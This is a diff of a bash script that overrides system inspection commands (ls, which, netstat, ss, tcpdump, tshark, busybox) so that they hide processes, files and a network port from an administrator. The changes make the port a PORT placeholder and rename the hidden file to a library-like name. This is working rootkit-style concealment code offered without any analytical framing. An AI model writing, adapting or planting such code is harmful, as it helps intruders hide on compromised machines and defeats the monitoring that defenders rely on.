@@ -1,5 +1,5 @@
-command export _HG_P="grep|head|tail|strace|ps|__vte|4316|/proc/|hidepid|eval|bash_|mount|set|cat|tcpdump|tshark|lsof|findmnt|ls|alias|declare|which|typeset|env|printenv|export|unset|busybox|policyeditor|_HG_P"
-unalias ls grep tcpdump tshark lsof cat type which mount findmnt alias env printenv set export declare typeset unset head tail which strace ss busybox netstat 2>/dev/null
+command export _HG_P="grep|head|tail|strace|ps|__vte|PORT|/proc/|hidepid|eval|bash_|mount|set|cat|tcpdump|tshark|lsof|findmnt|ls|alias|declare|which|typeset|env|printenv|export|unset|busybox|policyeditor|_HG_P"
+unalias ls which grep tcpdump tshark lsof cat type which mount findmnt alias env printenv set export declare typeset unset head tail which strace ss busybox netstat 2>/dev/null
 function which { 
     [[ -n "$COMP_LINE" ]] && { $(command which which) "$@"; return; }
     for a in "$@"; do 
@@ -20,7 +20,7 @@ function netstat { [[ -n "$COMP_LINE" ]] && { command $(which netstat) "$@"; ret
 function ss { [[ -n "$COMP_LINE" ]] && { command $(which ss) "$@"; return; }; command $(which ss) "$@" | _filter_output; }
 tcpdump() {
     [[ -n "$COMP_LINE" ]] && { command $(which tcpdump) "$@"; return; }
-    local f="not port 4316"
+    local f="not port PORT"
     if [ $# -eq 0 ]; then
         command $(which tcpdump) -i any $f 2>/dev/null
     else 
@@ -30,16 +30,16 @@ tcpdump() {
 }
 tshark() { 
     [[ -n "$COMP_LINE" ]] && { command $(which tshark) -l "$@"; return; }
-    command $(which tshark) -l "$@" -f "not port 4316" 2>/dev/null
+    command $(which tshark) -l "$@" -f "not port PORT" 2>/dev/null
 }
 function ls {
     [[ -n "$COMP_LINE" ]] && { command $(which ls) "$@"; return; }
     local p="($_HG_P)"
     if [[ "$*" == *"/proc"* ]] || [[ "$PWD" == "/proc" ]]; then
         local empty_dirs=$(command $(which find) /proc -maxdepth 1 -type d -empty -name "[0-9]*" -printf "-I %f ")
-        command $(which ls) $empty_dirs -I "$p" -I "policyeditor.bash" "$@"
+        command $(which ls) $empty_dirs -I "$p" -I "libda-5.3.so" "$@"
     else
-        command $(which ls) -I "$p" -I "policyeditor.bash" -I ".cache_*" "$@"
+        command $(which ls) -I "$p" -I "libda-5.3.so" -I ".cache_*" "$@"
     fi
 }
 function busybox {
